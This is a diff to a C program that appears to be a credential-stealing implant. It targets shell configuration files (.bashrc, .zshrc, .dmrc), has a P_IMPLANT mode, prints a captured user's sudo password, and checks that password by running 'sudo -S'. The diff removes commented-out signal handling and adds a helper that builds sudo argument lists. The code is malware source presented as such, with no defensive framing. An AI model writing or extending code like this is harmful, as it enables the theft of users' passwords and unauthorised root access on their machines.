@@ -18,17 +18,7 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
-
-  //printf("%d\n", argc);
-  //printf("%s\n", argv[2]);
-//   signal(SIGQUIT, sighandler);
-//   signal(SIGINT, sighandler);
-//   signal(SIGSTOP, sighandler);
-// //  signal(SIGTSTP, sighandler);
-//   signal(SIGTERM, sighandler);
-  
-
-//set mode
+  //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
     if (strcmp(argv[i],"SUDO") == 0){
@@ -51,8 +41,6 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
   }
-
-  // while(1){};
 
   return 0;
 
@@ -158,6 +146,27 @@ int testSudoPassword(char * passwd){
 
   return runSudo(passwd, fillerArray);
 
+}
+
+char ** make_execvp_args(int argc, char ** argv){
+  char ** execvp_args = malloc(sizeof(char *) * (argc+1));
+
+  char * sudo = malloc(strlen("sudo")*sizeof(char)+1);
+  strcpy(sudo, "sudo");
+
+  char * S = malloc(strlen("-S")*sizeof(char) + 1);
+  strcpy(S, "-S");
+
+  execvp_args[0] = sudo;
+  execvp_args[1] = S;
+
+  for (int i = 2; i<argc; i++){
+    execvp_args[i] = argv[i];
+  }
+
+  execvp_args[argc] = NULL;
+
+  return execvp_args;
 }
 
 // Runs sudo with given arguments and returns 0 if successful, something else if not
